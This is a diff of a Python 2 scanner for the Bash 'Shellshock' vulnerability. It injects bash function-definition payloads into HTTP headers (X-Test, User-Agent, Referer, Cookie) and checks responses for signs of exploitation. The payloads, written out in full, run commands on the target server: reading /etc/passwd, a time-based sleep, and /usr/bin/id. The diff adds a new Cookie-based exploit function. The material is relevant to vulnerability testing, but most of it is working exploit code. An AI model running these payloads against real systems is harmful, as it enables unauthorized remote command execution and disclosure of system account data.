@@ -15,7 +15,7 @@ waitTime = 0.0
 
 EXPLOIT1 = '() { :;};a=`/bin/cat /etc/passwd`;echo $a'
 SLEEP_TIME = 7
-EXPLOIT2 = '() { :;};sleep %s' % SLEEP_TIME
+EXPLOIT2 = '() { :;}; /bin/sleep %s' % SLEEP_TIME
 
 #env -i  X='() { (a)=>\' bash -c 'echo date'; cat echo
 #无漏洞的输出：
@@ -35,24 +35,26 @@ def testBashShock1(url):
 	req.add_header('Proxy-Connection', 'keep-alive')
 	req.add_header('Cache-Control', 'max-age=0')
 	req.add_header('X-Test', EXPLOIT1)
-	req.add_header('User-Agent', EXPLOIT1)
-	req.add_header('Referer',  EXPLOIT1)
-	req.add_header('X-Forwarded-For',  EXPLOIT1)
+	#req.add_header('User-Agent', EXPLOIT1)
+	#req.add_header('Referer',  EXPLOIT1)
+	#req.add_header('X-Forwarded-For',  EXPLOIT1)
 	#print '******* ' + url + ' *******'
 	try:
 		response = opener.open(req, timeout = 15)
 		if response:
-			if response.info().getheader('root'):
+			if response.info().getheader('root') or response.info().getheader('nobody') or \
+				response.info().getheader('daemon'):
 				print
 				print 'PANIC!!!'
-				print '******* [URL: %s], [Header: %s] [1]' % (url, 'X-Test')
+				print '******* [shock] [URL: %s], [Header: %s] [1]' % (url, 'X-Test')
 				print 'root:' + response.info().getheader('root')
 				return True
+
 			html = response.read()
 			if html.find('root:') != -1:
 				print
 				print 'PANIC!!!'
-				print '******* [URL: %s], [Header: %s] [2]' % (url, 'X-Test')
+				print '******* [shock] [URL: %s], [Header: %s] [2]' % (url, 'X-Test')
 			 	return True
 			#for k, v in response.info().items():
 			#	print k + ': ', v
@@ -76,7 +78,7 @@ def testBashShockByTime(url, header):
 	if t2 >= SLEEP_TIME and t2 > t1 and t2 < TIMEBASED_TIMEOUT:
 		print
 		print 'PANIC!!!'
-		print '******* [URL: %s] [Header: %s]' % (url, header)
+		print '******* [shock] [URL: %s] [Header: %s]' % (url, header)
 		print
 		return True
 
@@ -133,14 +135,39 @@ def testBashShock3(url):
 	return False
 """
 
+EXPLOIT3 = '() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id'
+def testBashShock5(url):
+	opener = urllib2.build_opener()
+	webutils.setupOpener(opener)
+	req = urllib2.Request(url)
+	req.add_header('Proxy-Connection', 'keep-alive')
+	req.add_header('Cache-Control', 'max-age=0')
+	req.add_header('Cookie',  EXPLOIT3)
+	try:
+		response = opener.open(req, timeout = 15)
+		html = response.read()
+		if html.find('uid=') != -1 and html.find('gid=') != -1 and html.find('groups=') != -1:
+			print
+			print 'PANIC!!!'
+			print '******* [shock] [URL: %s], [Header: %s] [5]' % (url, 'Cookie')
+			print 'root:' + response.info().getheader('root')
+			return True
+		return False
+	except Exception, e:
+		#print e
+	 	pass
+ 	return False
+
 def scan(url, opener):
 	if testBashShock1(url):
 		return True
 	if testBashShockByTime(url, 'Referer'):
 		return True
-	if testBashShockByTime(url, 'X-Forwarded-For'):
-		return True
+	#if testBashShockByTime(url, 'X-Forwarded-For'):
+	#	return True
 	if testBashShockByTime(url, 'User-Agent'):
+		return True
+	if testBashShock5(url):
 		return True
 	return False
 
